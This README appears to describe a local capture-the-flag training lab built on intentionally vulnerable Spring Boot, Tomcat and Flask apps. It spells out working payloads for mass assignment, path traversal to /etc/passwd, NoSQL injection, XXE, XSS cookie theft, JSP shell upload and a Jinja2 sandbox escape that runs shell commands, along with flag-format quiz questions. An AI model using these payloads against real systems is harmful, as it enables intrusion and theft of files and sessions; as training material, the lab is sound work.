# Security Champion 2024
AppSec CTF challenges

`docker compose up --build`

## Springboot challenges

### Mass assignment
If user is created in Registration, he will be a non-admin user by default.

The user can be registered through `curl` command and set the role to be `0`:

```
curl -X POST \
  http://localhost:8080/api/users/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "newuser",
    "password": "password",
    "firstname": "hello",
    "lastname": "world",
    "email": "newuser@secchamp.test",
    "phone": "1234567890",
    "role": 0
  }'
```

Sample Result
```
{"userId":9,"username":"newuser","password":"$2a$10$9gSURvUNwadwqDWLRNfn7eJHUvAgBKR9JHmIuRPrCFfRjB/LCjd/2","email":"newuser@secchamp.test","firstname":"hello","lastname":"world","phone":"1234567890","role":0,"createDate":"20240923122253","lastUpdateDate":null,"lastLogin":null}
```


#### ctf 
1. Please create a new admin user `secadmin` and find the flag.

(answer in the format of `Flag{base64 encoded user info stored in cookie}`)


### jwt token contains excessive information

Since the token is signed, modifying the content and regen the token as admin will not work
```
{
  "firstname": "admin",
  "role": 0,
  "phone": "12345678901111",
  "login": true,
  "userId": 1,
  "email": "admin@secchamp.test",
  "username": "admin",
  "lastname": "admin",
  "sub": "admin",
  "iat": 1727096012,
  "exp": 1727132012
}
```

#### ctf - N/A

### Directory Traversal (From Help Menu)
`http://localhost:8080/help?filePath=help.txt`

`http://localhost:8080/help?filePath=/etc/passwd`


#### ctf
1. What is the uid of root, daemon and nobody?

(answer in the format of `Flag{rootuid|daemonuid|nobodyuid}` ie 3 numbers with `|` to separate)


### nosqli

List out all tickets

`http://localhost:8080/pages/protected/tickets/details?id=%7B%24ne%3Anull%7D`

#### ctf
1. What is the urlencoded payload to list out all the tickets?

(answer in the format of `Flag{PAYLOAD}`)


### websocket

To hijack the ticket info bar
`http://localhost:8080/files/ws.html`

#### ctf
1. In the attacker's websocket html (`ws.html`), which line of code hijack and send message to the ticket info bar?
(copy that line of code as flag `Flag{that_line_of_code}`)


### SSTI

manipulate the expression in querystring

`http://localhost:8080/pages/calc?expression=System.getProperty(%22os.name%22)`

#### ctf
1. What is the payload to find the OS?

(answer in the format of `Flag{PAYLOAD}`)


2. What is the OS name?

(answer in the format of `Flag{OS_NAME}`)


### XXE

`http://localhost:8080/files/xml.html`

and submit the following XML

```
<?xml version="1.0" ?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

#### ctf
1. Assuming the entity name is `xxe`, what is the line of payload in the malicious XML that will read `/etc/passwd`

(answer in the format of `Flag{PAYLOAD}`, using double quotes for file path)


### File upload
demonstrating safe upload with various checking

`http://localhost:8080/pages/safe_upload`

no checking

`http://localhost:8080/pages/upload`

#### ctf
1. By using the safe upload function, if you upload `eicar.com.zip`, what will the antivirus detect?
(answer in the format of `Flag{DETECTED_RESULT}`)


### XSS

notice board has no checking

`http://localhost:8080/pages/protected/notice`

#### ctf
1. What is the payload of showing the cookie? (using `alert`, no need semi-colon)

(answer in the format of `Flag{PAYLOAD}`)


## Tomcat challenges
### Local File Inclusion (LFI)

Normal Loading file content

`http://localhost:18080/view.jsp?page=files/blank.txt`


Loading jsp and execute the code

`http://localhost:18080/view.jsp?page=files/policy.jsp`

#### ctf
1. What is the flag?

(answer in the format of `Flag{YOUR_FLAG}`)


### Files upload

no checking, can upload jsp shell

`http://localhost:18080/fileupload.jsp`

#### ctf
1. What is the result of the command `id`?

(answer in the format of `Flag{RESULT_of_id}`)


## Python-flask challenges
SSTI vulnerability in Jinja2

`http://localhost:5000/`

Normally it is a simple calcuator, press the numbers and operators to do calculation

`http://localhost:5000/?expression=2%2B2`

To escape the Jinja sandbox and regain access to the regular Python execution flow, you need to exploit objects that, although part of the non-sandboxed environment, are still accessible from within the sandbox.

It is using Python 3.9 and Jinja2, identify the subclasses
`http://localhost:5000/?expression=[].__class__.__mro__[1].__subclasses__()`


Found that 416 is ` <class 'subprocess.Popen'>`
 `http://localhost:5000/?expression=[].__class__.__mro__[1].__subclasses__()[416]`

 To list all folders, you can use this, you can see `/secret` folder, then `ls /secret`, the `flag.txt` is located there
`http://localhost:5000/?expression=[].__class__.__mro__[1].__subclasses__()[416]([%27ls%27,%20%27/%27],%20stdout=-1).communicate()[0]`

To read `secret/flag.txt`, you can use this
`http://localhost:5000/?expression=[].__class__.__mro__[1].__subclasses__()[416]([%27cat%27,%20%27/secret/flag.txt%27],%20stdout=-1).communicate()[0]`


#### ctf
1. What is the flag?

(answer in the format of `Flag{YOUR_FLAG}`)


2. What is the payload to find all subclasses?

(answer in the format of `Flag{PAYLOAD}`)


3. What is the 416th class?

(answer in the format of `Flag{CLASS_NAME}`)


4. What is the payload to check the identify?

(answer in the format of `Flag{PAYLOAD}`)


## Nodejs challenges

`http://localhost:3000`
